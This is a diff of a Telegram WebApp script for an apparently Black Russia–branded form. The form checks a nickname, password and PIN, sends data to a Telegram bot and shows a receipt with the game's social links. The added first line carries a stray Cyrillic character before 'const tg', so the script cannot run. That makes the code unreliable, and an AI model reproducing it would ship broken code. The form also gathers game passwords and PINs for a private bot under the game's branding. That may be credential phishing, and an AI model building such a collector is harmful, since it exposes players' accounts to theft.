@@ -1,4 +1,4 @@
-const tg = window.Telegram.WebApp;
+мconst tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
@@ -28,23 +28,28 @@ function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g
 function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }
 
 function checkNick() {
-    const nick = document.getElementById('nick').value.trim();
+    const nick = document.getElementById('nick');
     const icon = document.getElementById('iconNick');
-    if (!icon) return;
-    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
+    if (!nick || !icon) return;
+    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick.value.trim()) && nick.value.trim().length >= 5;
     if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
     else { icon.classList.remove('green'); icon.classList.add('red'); }
 }
-function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
 
 function checkPassword() {
+    // Ищем либо поле пароля, либо новое поле пароля (для восстановления)
     const pass = document.getElementById('password') || document.getElementById('new_password');
+    // Ищем иконку либо для пароля, либо для нового пароля
     const icon = document.getElementById('iconPass') || document.getElementById('iconNewPass');
+    
     if (!pass || !icon) return;
+    
     const valid = /^[A-Za-z]{7,}$/.test(pass.value);
     if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
     else { icon.classList.remove('green'); icon.classList.add('red'); }
 }
+
+function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
 function validatePassword(pass) { return /^[A-Za-z]{7,}$/.test(pass); }
 
 function togglePin() {
@@ -78,7 +83,11 @@ function selectServer(value) {
 }
 
 function sendToBot(text) {
-    try { tg.sendData(text); } catch (e) { console.error(e); }
+    try {
+        tg.sendData(text);
+    } catch (e) {
+        console.error('Ошибка отправки:', e);
+    }
 }
 
 function showReceipt(nick, server, type) {
@@ -106,10 +115,10 @@ function showReceipt(nick, server, type) {
             </div>
             <div class="receipt-social-title">Следи за нашими соцсетями</div>
             <div class="receipt-socials">
-                <a href="https://vk.ru/blackrussia.online" target="_blank" class="receipt-soc vk">VK</a>
-                <a href="https://t.me/br_dev" target="_blank" class="receipt-soc tg">TG</a>
-                <a href="#" class="receipt-soc ds">DS</a>
-                <a href="#" class="receipt-soc yt">YT</a>
+                <a href="https://vk.ru/blackrussia.online" target="_blank" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/145/145813.png"></a>
+                <a href="https://t.me/br_dev" target="_blank" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png"></a>
+                <a href="#" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png"></a>
+                <a href="#" class="receipt-soc"><img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png"></a>
             </div>
         </div>
     `;
